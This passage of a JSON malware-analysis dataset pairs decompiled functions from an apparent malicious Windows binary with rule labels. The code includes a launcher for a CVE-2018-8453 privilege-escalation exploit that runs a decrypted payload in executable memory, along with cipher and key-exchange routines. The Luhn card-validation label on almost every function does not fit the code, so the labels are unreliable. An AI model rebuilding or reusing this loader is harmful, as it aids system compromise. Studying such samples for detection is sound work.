        "decompiled_code": "\nuint __cdecl fcn.00408633(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint arg_10h;\n    \n    uVar1 = (**0x413cbc)(arg_8h, arg_ch);\n    arg_10h = 0x4216a0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    fcn.00405082(7, L\"[DBG] \", arg_10h);\n    fcn.00405082(8, L\"rename:%s:%s:%s\\r\\n\", arg_8h);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    return uVar1;\n}\n",
        "token_count": 154
    },
    "00408afa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408afa(void)\n\n{\n    uint arg_10h;\n    uint arg_10h_00;\n    \n    arg_10h_00 = 0x4216a0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    arg_10h = 7;\n    fcn.00405082(7, L\"[DBG] \", arg_10h_00);\n    fcn.00405082(8, L\"core_close() - Completion of the program\\r\\n\", arg_10h);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(0x4216a0);\n    (*_sym.imp.KERNEL32.dll_SetConsoleTextAttribute)(*0x421358, *0x42135c);\n    return;\n}\n",
        "token_count": 184
    },
    "00408b2f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00408b2f(void)\n\n{\n    uint32_t uVar1;\n    uchar auStack112 [8];\n    uint var_64h;\n    uchar uStack91;\n    uchar auStack88 [5];\n    uint var_4fh;\n    uchar uStack68;\n    uchar auStack64 [4];\n    uint var_38h;\n    uint var_34h;\n    uchar uStack48;\n    uchar auStack44 [4];\n    uint var_24h;\n    uint var_20h;\n    uchar uStack30;\n    uint uStack28;\n    uint var_10h;\n    uint uVar2;\n    uint var_2h;\n    \n    fcn.00404ff9();\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    uVar2 = 7;\n    fcn.00405082(7, L\"[DBG] \", 0x4216a0);\n    uStack28 = 0x408b59;\n    fcn.00405082(8, 0x40ff50, uVar2);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n    uVar1 = 0;\n    do {\n        uVar2 = fcn.00407d52(*(uVar1 + 0x413be8));\n        *(uVar1 + 0x413be8) = uVar2;\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x268);\n    fcn.00406625(0x420aa0, 0x581, 0xe, 0x15, &stack0xffffff90);\n    uStack91 = 0;\n    fcn.00406625(0x420aa0, 0x455, 9, 0xe, &stack0xffffffe4);\n    fcn.00406625(0x420aa0, 0x395, 9, 0x14, &stack0xffffffa8);\n    uStack68 = 0;\n    fcn.00406625(0x420aa0, 0x634, 0xf, 0x10, &stack0xffffffc0);\n    uStack48 = 0;\n    fcn.00406625(0x420aa0, 0x2c6, 7, 0xe, &stack0xffffffd4);\n    uStack30 = 0;\n    uVar2 = fcn.00407c6d(&stack0xffffff90);\n    *0x413c30 = (**0x413c48)(uVar2);\n    uVar2 = fcn.00407c6d(&stack0xffffffe4);\n    *0x413da8 = (**0x413c48)(uVar2);\n    uVar2 = fcn.00407c6d(&stack0xffffffa8);\n    *0x413d94 = (**0x413c48)(uVar2);\n    uVar2 = fcn.00407c6d(&stack0xffffffc0);\n    *0x413c54 = (**0x413c48)(uVar2);\n    uVar2 = fcn.00407c6d(&stack0xffffffd4);\n    *0x413ca8 = (**0x413c48)(uVar2);\n    return;\n}\n",
        "token_count": 755
    },
    "00408b69": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408b69(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint uVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    uVar5 = 0x4216a0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    uVar4 = 7;\n    fcn.00405082(7, L\"[DBG] \", uVar5);\n    fcn.00405082(8, L\"start LPE (cve_2018_8453)\\r\\n\", uVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_LeaveCriticalSection;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n    iVar2 = fcn.00408c5f();\n    if (iVar2 == 0) {\n        uVar5 = 0x4216a0;\n        (*pcVar3)();\n        uVar4 = 0xc;\n        fcn.00405082(0xc, L\"[ERR] \", uVar5);\n        fcn.00405082(4, L\"LPE: System NOT vulnerable\\r\\n\", uVar4);\n        fcn.00405082(4, L\"      %S:%S:%lu\\r\\n\", \"D:\\\\1\\\\core\\\\src\\\\exploits\\\\cve_2018_8453.c\");\n        (*pcVar1)(0x4216a0);\n    }\n    else {\n        iVar2 = fcn.00405c6b();\n        if (iVar2 == 0) {\n            uVar4 = 0x41d4a0;\n            var_8h = 0x413e84;\n            uVar5 = 0x3600;\n            var_4h = 0x15;\n        }\n        else {\n            uVar4 = 0x413ea0;\n            var_8h = 0x413e50;\n            uVar5 = 0x9600;\n            var_4h = 0x31;\n        }\n        pcVar3 = (**0x413cb8)(0, uVar5, 0x3000, 0x40);\n        if (pcVar3 != NULL) {\n            fcn.00405228(pcVar3, uVar4, uVar5);\n            fcn.004077f8(var_8h, var_4h, pcVar3, uVar5, pcVar3);\n            uVar4 = (*pcVar3)(arg_8h);\n            return uVar4;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 603
    },
    "00408db6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408db6(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00408e7e(arg_8h, 0x80, arg_ch);\n    return;\n}\n",
        "token_count": 48
    },
    "00408dce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408dce(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00408ea5(arg_8h, 0x80, arg_ch);\n    return;\n}\n",
        "token_count": 47
    },
    "00408de6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408de6(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00408e7e(arg_8h, 0xc0, arg_ch);\n    return;\n}\n",
        "token_count": 48
    },
    "00408dfe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408dfe(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00408ea5(arg_8h, 0xc0, arg_ch);\n    return;\n}\n",
        "token_count": 47
    },
    "00408e16": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408e16(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00408e7e(arg_8h, 0x100, arg_ch);\n    return;\n}\n",
        "token_count": 48
    },
    "00408e2e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408e2e(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00408ea5(arg_8h, 0x100, arg_ch);\n    return;\n}\n",
        "token_count": 48
    },
    "00408e46": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408e46(uint *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.004095ab(arg_8h + 1, *arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 62
    },
    "00408e62": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408e62(uint *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00409acb(arg_8h + 1, *arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 62
    },
    "00408e7e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00408e7e(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00409fee(arg_8h + 1, arg_10h, arg_ch);\n    *arg_8h = iVar1;\n    return iVar1 != 0;\n}\n",
        "token_count": 85
    },
    "00408ea5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00408ea5(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040a1cd(arg_8h + 1, arg_10h, arg_ch);\n    *arg_8h = iVar1;\n    return iVar1 != 0;\n}\n",
        "token_count": 86
    },
    "00408ecc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408ecc(uint *arg_8h, uint *arg_ch, uint32_t arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint var_40h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    arg_8h_00 = arg_8h;\n    if ((*(arg_8h + 0x118) == 0) || (0x10000 < arg_10h)) {\n        return 0;\n    }\n    if (arg_18h == 0) {\n        fcn.0040524d(&var_40h, 0, 0x30);\n    }\n    else {\n        if (0x30 < arg_18h) {\n            return 0;\n        }\n        fcn.00405228(&var_40h, arg_14h, arg_18h);\n        if (arg_18h != 0x30) {\n            fcn.0040524d(&var_40h + arg_18h, 0, 0x30 - arg_18h);\n        }\n        fcn.00409176(arg_8h, &var_40h);\n    }\n    if (*(arg_8h + 0x11c) == 0) {\n        fcn.004077bf(arg_8h + 0xf8, 0x10);\n        fcn.00408e62(arg_8h, arg_8h + 0xf8, arg_8h + 0x108);\n        *(arg_8h + 0x11c) = 1;\n    }\n    if (arg_10h < 0x10) {\n        arg_8h = arg_ch;\n    }\n    else {\n        arg_8h = arg_ch;\n        do {\n            iVar1 = 0;\n            fcn.004077bf(arg_8h_00 + 0xf8, 0x10);\n            fcn.00408e62(arg_8h_00, arg_8h_00 + 0xf8, arg_8h);\n            while (arg_8h[iVar1] == (arg_8h_00 + 0x108)[iVar1]) {\n                iVar1 = iVar1 + 1;\n                if (iVar1 == 4) {\n                    return 0;\n                }\n            }\n            arg_10h = arg_10h - 0x10;\n            *(arg_8h_00 + 0x108) = *arg_8h;\n            *(arg_8h_00 + 0x10c) = arg_8h[1];\n            *(arg_8h_00 + 0x110) = arg_8h[2];\n            *(arg_8h_00 + 0x114) = arg_8h[3];\n            arg_8h = arg_8h + 4;\n        } while (0xf < arg_10h);\n    }\n    iVar1 = 0;\n    if (arg_10h == 0) {\ncode_r0x0040903a:\n        if (*(arg_8h_00 + 0xf4) < 0x1000001) {\n            *(arg_8h_00 + 0xf4) = *(arg_8h_00 + 0xf4) + 1;\n            fcn.00409176(arg_8h_00, &var_40h);\n            return 1;\n        }\n    }\n    else {\n        fcn.004077bf(arg_8h_00 + 0xf8, 0x10);\n        fcn.00408e62(arg_8h_00, arg_8h_00 + 0xf8, &var_10h);\n        do {\n            if ((&var_10h)[iVar1] != (arg_8h_00 + 0x108)[iVar1]) {\n                *(arg_8h_00 + 0x108) = var_10h;\n                *(arg_8h_00 + 0x10c) = uStack16;\n                *(arg_8h_00 + 0x110) = uStack12;\n                *(arg_8h_00 + 0x114) = uStack8;\n                fcn.00405228(arg_8h, &var_10h, arg_10h);\n                goto code_r0x0040903a;\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 != 4);\n    }\n    return 0;\n}\n",
        "token_count": 1030
    },
    "00409069": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409069(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_20h;\n    \n    fcn.0040524d(arg_8h, 0, 0x120);\n    puVar2 = &var_20h;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00408ea5(arg_8h, 0x100, &var_20h);\n    fcn.004090fe(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 199
    },
    "004090b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004090b6(uint arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_10h_00;\n    \n    if (arg_10h != 0) {\n        do {\n            arg_10h_00 = arg_10h;\n            if (0x10000 < arg_10h) {\n                arg_10h_00 = 0x10000;\n            }\n            iVar1 = fcn.00408ecc(arg_8h, arg_ch, arg_10h_00, 0, 0);\n            if (iVar1 == 0) {\n                return 0;\n            }\n            arg_ch = arg_ch + arg_10h_00;\n            arg_10h = arg_10h - arg_10h_00;\n        } while (arg_10h != 0);\n    }\n    return 1;\n}\n",
        "token_count": 209
    },
    "004091e7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004091e7(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_44h;\n    int32_t var_4h;\n    \n    if (arg_14h != 0) {\n        var_4h = arg_ch - &var_44h;\n        uVar4 = arg_14h;\n        arg_14h = arg_10h - &var_44h;\n        while( true ) {\n            uVar5 = 0;\n            fcn.0040934d(&var_44h, arg_8h);\n            iVar2 = var_4h;\n            piVar1 = arg_8h + 0x20;\n            *piVar1 = *piVar1 + 1;\n            if (*piVar1 == 0) {\n                *(arg_8h + 0x24) = *(arg_8h + 0x24) + 1;\n            }\n            if (uVar4 < 0x41) break;\n            uVar5 = 0;\n            do {\n                puVar3 = &var_44h + uVar5;\n                uVar5 = uVar5 + 1;\n                puVar3[arg_14h] = puVar3[iVar2] ^ *puVar3;\n            } while (uVar5 < 0x40);\n            uVar4 = uVar4 - 0x40;\n            arg_14h = arg_14h + 0x40;\n            arg_10h = arg_10h + 0x40;\n            arg_ch = arg_ch + 0x40;\n            var_4h = var_4h + 0x40;\n        }\n        if (uVar4 != 0) {\n            do {\n                puVar3 = &var_44h + uVar5;\n                uVar5 = uVar5 + 1;\n                puVar3[arg_10h - &var_44h] = puVar3[arg_ch - &var_44h] ^ *puVar3;\n            } while (uVar5 < uVar4);\n        }\n    }\n    return;\n}\n",
        "token_count": 524
    },
    "004092af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004092af(uint *arg_8h, uint *arg_ch, int32_t arg_10h)\n\n{\n    arg_8h[1] = *arg_ch;\n    arg_8h[2] = arg_ch[1];\n    arg_8h[3] = arg_ch[2];\n    arg_8h[4] = arg_ch[3];\n    if (arg_10h == 0x100) {\n        arg_ch = arg_ch + 4;\n        *0x4214bc = \"expand 32-byte kexpand 16-byte k\";\n    }\n    else {\n        *0x4214bc = \"expand 16-byte k\";\n    }\n    arg_8h[0xb] = *arg_ch;\n    arg_8h[0xc] = arg_ch[1];\n    arg_8h[0xd] = arg_ch[2];\n    arg_8h[0xe] = arg_ch[3];\n    *arg_8h = **0x4214bc;\n    arg_8h[5] = *(*0x4214bc + 4);\n    arg_8h[10] = *(*0x4214bc + 8);\n    arg_8h[0xf] = *(*0x4214bc + 0xc);\n    return;\n}\n",
        "token_count": 288
    },
    "0040a85e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a85e(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_190h;\n    uint var_140h;\n    uint var_f0h;\n    uint var_a0h;\n    uint var_50h;\n    \n    fcn.0040bc81(&var_f0h, arg_ch);\n    fcn.0040bc81(&var_a0h, &var_f0h);\n    fcn.0040bc81(&var_50h, &var_a0h);\n    fcn.0040b4a3(&var_140h, &var_50h, arg_ch);\n    fcn.0040b4a3(&var_190h, &var_140h, &var_f0h);\n    fcn.0040bc81(&var_50h, &var_190h);\n    fcn.0040b4a3(&var_f0h, &var_50h, &var_140h);\n    fcn.0040bc81(&var_50h, &var_f0h);\n    fcn.0040bc81(&var_a0h, &var_50h);\n    fcn.0040bc81(&var_50h, &var_a0h);\n    fcn.0040bc81(&var_a0h, &var_50h);\n    fcn.0040bc81(&var_50h, &var_a0h);\n    fcn.0040b4a3(&var_140h, &var_50h, &var_f0h);\n    fcn.0040bc81(&var_50h, &var_140h);\n    fcn.0040bc81(&var_a0h, &var_50h);\n    iVar2 = 4;\n    iVar1 = iVar2;\n    do {\n        fcn.0040bc81(&var_50h, &var_a0h);\n        fcn.0040bc81(&var_a0h, &var_50h);\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.0040b4a3(&var_f0h, &var_a0h, &var_140h);\n    fcn.0040bc81(&var_50h, &var_f0h);\n    fcn.0040bc81(&var_a0h, &var_50h);\n    iVar1 = 9;\n    do {\n        fcn.0040bc81(&var_50h, &var_a0h);\n        fcn.0040bc81(&var_a0h, &var_50h);\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.0040b4a3(&var_50h, &var_a0h, &var_f0h);\n    fcn.0040bc81(&var_a0h, &var_50h);\n    fcn.0040bc81(&var_50h, &var_a0h);\n    do {\n        fcn.0040bc81(&var_a0h, &var_50h);\n        fcn.0040bc81(&var_50h, &var_a0h);\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    fcn.0040b4a3(&var_f0h, &var_50h, &var_140h);\n    fcn.0040bc81(&var_50h, &var_f0h);\n    fcn.0040bc81(&var_a0h, &var_50h);\n    iVar2 = 0x18;\n    iVar1 = iVar2;\n    do {\n        fcn.0040bc81(&var_50h, &var_a0h);\n        fcn.0040bc81(&var_a0h, &var_50h);\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.0040b4a3(&var_140h, &var_a0h, &var_f0h);\n    fcn.0040bc81(&var_a0h, &var_140h);\n    fcn.0040bc81(&var_50h, &var_a0h);\n    iVar1 = 0x31;\n    do {\n        fcn.0040bc81(&var_a0h, &var_50h);\n        fcn.0040bc81(&var_50h, &var_a0h);\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.0040b4a3(&var_a0h, &var_50h, &var_140h);\n    fcn.0040bc81(&var_50h, &var_a0h);\n    fcn.0040bc81(&var_a0h, &var_50h);\n    do {\n        fcn.0040bc81(&var_50h, &var_a0h);\n        fcn.0040bc81(&var_a0h, &var_50h);\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    fcn.0040b4a3(&var_50h, &var_a0h, &var_f0h);\n    fcn.0040bc81(&var_a0h, &var_50h);\n    fcn.0040bc81(&var_50h, &var_a0h);\n    fcn.0040bc81(&var_a0h, &var_50h);\n    fcn.0040bc81(&var_50h, &var_a0h);\n    fcn.0040bc81(&var_a0h, &var_50h);\n    fcn.0040b4a3(arg_8h, &var_a0h, &var_190h);\n    return;\n}\n",
        "token_count": 1322
    },
    "0040b25d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040b25d(uint arg_8h, uint arg_ch, uint *arg_10h, uint *arg_14h, uint *arg_18h, uint arg_1ch, uint *arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    ulong uVar5;\n    uint var_1c8h;\n    uint var_180h;\n    uint var_130h;\n    uint auStack304 [19];\n    uint var_e0h;\n    uint var_98h;\n    uint auStack152 [37];\n    \n    puVar2 = arg_18h;\n    puVar4 = &var_180h;\n    for (iVar1 = 0x14; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.0040bff1(arg_18h, arg_1ch);\n    fcn.0040af5c(arg_1ch, &var_180h);\n    puVar2 = arg_20h;\n    puVar4 = &var_180h;\n    for (iVar1 = 0x14; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.0040bff1(arg_20h, arg_24h);\n    fcn.0040af5c(arg_24h, &var_180h);\n    fcn.0040b4ef(&var_130h, arg_20h, arg_1ch);\n    fcn.0040b4ef(&var_98h, arg_18h, arg_24h);\n    fcn.0040bad1(&var_130h);\n    fcn.0040b9bd(&var_130h);\n    fcn.0040bad1(&var_98h);\n    fcn.0040b9bd(&var_98h);\n    puVar2 = &var_130h;\n    puVar4 = &var_180h;\n    for (iVar1 = 0x14; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.0040bff1(&var_130h, &var_98h);\n    fcn.0040af5c(&var_98h, &var_180h);\n    fcn.0040bc81(&var_1c8h, &var_130h);\n    fcn.0040bc81(&var_130h, &var_98h);\n    fcn.0040b4ef(&var_98h, &var_130h, arg_28h);\n    fcn.0040bad1(&var_98h);\n    fcn.0040b9bd(&var_98h);\n    puVar2 = &var_1c8h;\n    for (iVar1 = 0x14; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *arg_10h = *puVar2;\n        puVar2 = puVar2 + 1;\n        arg_10h = arg_10h + 1;\n    }\n    puVar2 = &var_98h;\n    for (iVar1 = 0x14; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *arg_14h = *puVar2;\n        puVar2 = puVar2 + 1;\n        arg_14h = arg_14h + 1;\n    }\n    fcn.0040bc81(&var_1c8h, arg_18h);\n    fcn.0040bc81(&var_98h, arg_1ch);\n    puVar2 = &var_1c8h;\n    fcn.0040b4ef(arg_8h, puVar2, &var_98h);\n    fcn.0040bad1(arg_8h);\n    fcn.0040b9bd(arg_8h);\n    fcn.0040af5c(&var_98h, &var_1c8h);\n    fcn.0040524d(&var_e0h, 0, 0x48);\n    uVar3 = 0;\n    do {\n        uVar5 = fcn.0040df30(puVar2, *(auStack152 + uVar3), 0x1db41, 0, *(auStack152 + (uVar3 - 4)));\n        *(auStack304 + (uVar3 - 4)) = uVar5;\n        *(auStack304 + uVar3) = uVar5 >> 0x20;\n        uVar3 = uVar3 + 8;\n    } while (uVar3 < 0x50);\n    fcn.0040b9bd(&var_130h);\n    fcn.0040bff1(&var_130h, &var_1c8h);\n    fcn.0040b4ef(arg_ch, &var_98h, &var_130h);\n    fcn.0040bad1(arg_ch);\n    fcn.0040b9bd(arg_ch);\n    return;\n}\n",
        "token_count": 1257
    },
    "0040b4a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b4a3(uint *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_98h;\n    \n    fcn.0040b4ef(&var_98h, arg_ch, arg_10h);\n    fcn.0040bad1(&var_98h);\n    fcn.0040b9bd(&var_98h);\n    puVar2 = &var_98h;\n    for (iVar1 = 0x14; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *arg_8h = *puVar2;\n        puVar2 = puVar2 + 1;\n        arg_8h = arg_8h + 1;\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "0040b4ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b4ef(uint *arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    uint32_t uVar24;\n    uint32_t uVar25;\n    uint32_t uVar26;\n    uint32_t uVar27;\n    uint32_t uVar28;\n    uint32_t uVar29;\n    uint32_t uVar30;\n    uint32_t uVar31;\n    uint32_t uVar32;\n    uint32_t uVar33;\n    uint32_t uVar34;\n    uint32_t uVar35;\n    uint32_t uVar36;\n    uint32_t uVar37;\n    uint32_t uVar38;\n    \n    iVar1 = *arg_ch;\n    iVar2 = *arg_10h;\n    *arg_8h = iVar1 * iVar2;\n    arg_8h[1] = iVar1 * iVar2 >> 0x20;\n    iVar1 = arg_ch[2];\n    iVar2 = *arg_10h;\n    uVar21 = iVar1 * iVar2;\n    iVar3 = *arg_ch;\n    iVar4 = arg_10h[2];\n    uVar22 = iVar3 * iVar4;\n    arg_8h[2] = uVar21 + uVar22;\n    arg_8h[3] = (iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar21, uVar22);\n    iVar1 = arg_ch[2];\n    iVar2 = arg_10h[2];\n    uVar22 = iVar1 * iVar2;\n    iVar3 = *arg_ch;\n    iVar4 = arg_10h[4];\n    uVar23 = iVar3 * iVar4;\n    uVar21 = uVar22 * 2;\n    uVar25 = uVar21 + uVar23;\n    iVar5 = arg_ch[4];\n    iVar6 = *arg_10h;\n    uVar24 = iVar5 * iVar6;\n    arg_8h[4] = uVar25 + uVar24;\n    arg_8h[5] = ((iVar1 * iVar2 >> 0x20) << 1 | uVar22 >> 0x1f) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar21, uVar23) +\n                (iVar5 * iVar6 >> 0x20) + CARRY4(uVar25, uVar24);\n    iVar1 = *arg_ch;\n    iVar2 = arg_10h[6];\n    uVar21 = iVar1 * iVar2;\n    iVar3 = arg_ch[2];\n    iVar4 = arg_10h[4];\n    uVar22 = iVar3 * iVar4;\n    uVar25 = uVar21 + uVar22;\n    iVar5 = arg_ch[4];\n    iVar6 = arg_10h[2];\n    uVar23 = iVar5 * iVar6;\n    uVar26 = uVar25 + uVar23;\n    iVar7 = arg_ch[6];\n    iVar8 = *arg_10h;\n    uVar24 = iVar7 * iVar8;\n    arg_8h[6] = uVar26 + uVar24;\n    arg_8h[7] = (iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar21, uVar22) + (iVar5 * iVar6 >> 0x20) +\n                CARRY4(uVar25, uVar23) + (iVar7 * iVar8 >> 0x20) + CARRY4(uVar26, uVar24);\n    iVar1 = arg_ch[6];\n    iVar2 = arg_10h[2];\n    uVar22 = iVar1 * iVar2;\n    iVar3 = arg_ch[2];\n    iVar4 = arg_10h[6];\n    uVar23 = iVar3 * iVar4;\n    uVar27 = uVar22 + uVar23;\n    iVar5 = arg_ch[4];\n    iVar6 = arg_10h[4];\n    uVar24 = iVar5 * iVar6;\n    uVar21 = uVar27 * 2;\n    uVar28 = uVar21 + uVar24;\n    iVar7 = arg_ch[8];\n    iVar8 = *arg_10h;\n    uVar25 = iVar7 * iVar8;\n    uVar29 = uVar28 + uVar25;\n    iVar9 = *arg_ch;\n    iVar10 = arg_10h[8];\n    uVar26 = iVar9 * iVar10;\n    arg_8h[8] = uVar29 + uVar26;\n    arg_8h[9] = (((iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar22, uVar23)) * 2 | uVar27 >> 0x1f) +\n                (iVar5 * iVar6 >> 0x20) + CARRY4(uVar21, uVar24) + (iVar7 * iVar8 >> 0x20) + CARRY4(uVar28, uVar25) +\n                (iVar9 * iVar10 >> 0x20) + CARRY4(uVar29, uVar26);\n    iVar1 = *arg_ch;\n    iVar2 = arg_10h[10];\n    uVar21 = iVar1 * iVar2;\n    iVar3 = arg_ch[2];\n    iVar4 = arg_10h[8];\n    uVar22 = iVar3 